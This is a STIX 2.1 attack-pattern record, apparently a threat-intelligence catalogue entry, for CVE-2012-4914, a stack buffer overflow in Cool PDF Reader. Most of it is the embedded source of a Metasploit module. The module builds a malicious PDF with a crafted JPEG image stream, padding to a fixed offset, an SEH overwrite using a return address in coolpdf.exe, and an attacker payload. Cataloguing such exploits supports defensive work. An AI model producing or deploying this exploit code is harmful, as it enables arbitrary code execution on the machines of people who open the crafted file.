{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9a1c2185-0cbb-4c8a-aa76-2bea29051009",
    "created": "2024-08-14T16:38:27.745479Z",
    "modified": "2024-08-14T16:38:27.745483Z",
    "name": "Cool PDF Image Stream Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Cool PDF Reader prior to version 3.0.2.256. The vulnerability is triggered when opening a malformed PDF file that contains a specially crafted image stream. This module has been tested successfully on Cool PDF 3.0.2.256 over Windows XP SP3 and Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/coolpdf_image_stream_bof.rb",
            "external_id": "coolpdf_image_stream_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4914"
        },
        {
            "source_name": "reference",
            "url": "http://www.protekresearchlab.com/index.php?option=com_content&view=article&id=70&Itemid=70"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::PDF\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cool PDF Image Stream Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Cool PDF Reader prior to version\n        3.0.2.256. The vulnerability is triggered when opening a malformed PDF file that\n        contains a specially crafted image stream. This module has been tested successfully\n        on Cool PDF 3.0.2.256 over Windows XP SP3 and Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Francis Provencher', # Vulnerability discovery\n          'Chris Gabriel', # Proof of concept\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-4914' ],\n          [ 'OSVDB', '89349' ],\n          [ 'EDB', '24463' ],\n          [ 'URL', 'http://www.protekresearchlab.com/index.php?option=com_content&view=article&id=70&Itemid=70' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 2000,\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Cool PDF 3.0.2.256 / Windows 7 SP1 / Windows XP SP3',\n            {\n              'Offset' => 433,\n              'Ret' => 0x00539fa4 # ppr from coolpdf.exe\n            }\n          ]\n        ],\n      'DisclosureDate' => '2013-01-18',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The output filename.', 'msf.pdf'])\n      ])\n  end\n\n  def exploit\n    file_create(make_pdf)\n  end\n\n  def jpeg\n    p = payload.encoded\n    sploit =  \"\\xFF\\xD8\\xFF\\xEE\\x00\\x0E\\x41\\x64\" + \"\\x6F\\x62\\x65\\x00\\x64\\x80\\x00\\x00\"\n    sploit << \"\\x00\\x02\\xFF\\xDB\\x00\\x84\\x00\\x02\" + \"\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\"\n    sploit << \"\\x02\\x03\\x02\\x02\\x02\\x03\\x04\\x03\" + \"\\x03\\x03\\x03\\x04\\x05\\x04\\x04\\x04\"\n    sploit << \"\\x04\\x04\\x05\\x05\\x05\\x05\\x05\\x05\" + \"\\x05\\x05\\x05\\x05\\x07\\x08\\x08\\x08\"\n    sploit << \"\\x07\\x05\\x09\\x0A\\x0A\\x0A\\x0A\\x09\" + \"\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\"\n    sploit << \"\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\\x0C\\x01\" + \"\\x03\\x02\\x02\\x03\\x03\\x03\\x07\\x05\"\n    sploit << \"\\x05\\x07\\x0D\\x0A\\x09\\x0A\\x0D\\x0F\" + \"\\x0D\\x0D\\x0D\\x0D\\x0F\\x0F\\x0C\\x0C\"\n    sploit << \"\\x0C\\x0C\\x0C\\x0F\\x0F\\x0C\\x0C\\x0C\" + \"\\x0C\\x0C\\x0C\\x0F\\x0C\\x0E\\x0E\\x0E\"\n    sploit << \"\\x0E\\x0E\\x0C\\x11\\x11\\x11\\x11\\x11\" + \"\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\"\n    sploit << \"\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\" + \"\\xFF\\xC0\\x00\\x14\\x08\\x00\\x32\\x00\"\n    sploit << \"\\xE6\\x04\\x01\\x11\\x00\\x02\\x11\\x01\" + \"\\x03\\x11\\x01\\x04\\x11\\x00\\xFF\\xC4\"\n    sploit << \"\\x01\\xA2\\x00\\x00\\x00\\x07\\x01\\x01\" + \"\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\"\n    sploit << \"\\x00\\x00\\x00\\x04\\x05\\x03\\x02\\x06\" + \"\\x01\\x00\\x07\\x08\\x09\\x0A\\x0B\\x01\"\n    sploit << \"\\x54\\x02\\x02\\x03\\x01\\x01\\x01\\x01\" + \"\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    sploit << \"\\x01\\x00\\x02\\x03\\x04\\x05\\x06\\x07\"\n    sploit << rand_text(target['Offset'])\n    sploit << generate_seh_record(target.ret)\n    sploit << p\n    sploit << rand_text(2388 - p.length)\n    return sploit\n  end\n\n  # Override the mixin obfuscator since it doesn't seem to work here.\n  def n_obfu(str)\n    return str\n  end\n\n  def make_pdf\n    @pdf << header\n    add_object(1, n_obfu(\"<</Type/Catalog/Outlines 2 0 R /Pages 3 0 R>>\"))\n    add_object(2, n_obfu(\"<</Type/Outlines>>\"))\n    add_object(3, n_obfu(\"<</Type/Pages/Kids[5 0 R]/Count 1/Resources <</ProcSet 4 0 R/XObject <</I0 7 0 R>>>>/MediaBox[0 0 612.0 792.0]>>\"))\n    add_object(4, n_obfu(\"[/PDF/Text/ImageC]\"))\n    add_object(5, n_obfu(\"<</Type/Page/Parent 3 0 R/Contents 6 0 R>>\"))\n    stream_1 = \"stream\" << eol\n    stream_1 << \"0.000 0.000 0.000 rg 0.000 0.000 0.000 RG q 265.000 0 0 229.000 41.000 522.000 cm /I0 Do Q\" << eol\n    stream_1 << \"endstream\" << eol\n    add_object(6, n_obfu(\"<</Length 91>>#{stream_1}\"))\n    stream = \"<<\" << eol\n    stream << \"/Width 230\" << eol\n    stream << \"/BitsPerComponent 8\" << eol\n    stream << \"/Name /X\" << eol\n    stream << \"/Height 50\" << eol\n    stream << \"/Intent /RelativeColorimetric\" << eol\n    stream << \"/Subtype /Image\" << eol\n    stream << \"/Filter /DCTDecode\" << eol\n    stream << \"/Length #{jpeg.length}\" << eol\n    stream << \"/ColorSpace /DeviceCMYK\" << eol\n    stream << \"/Type /XObject\" << eol\n    stream << \">>\"\n    stream << \"stream\" << eol\n    stream << jpeg << eol\n    stream << \"endstream\" << eol\n    add_object(7, stream)\n    finish_pdf\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-18",
    "x_mitre_platforms": [
        "win'"
    ]
}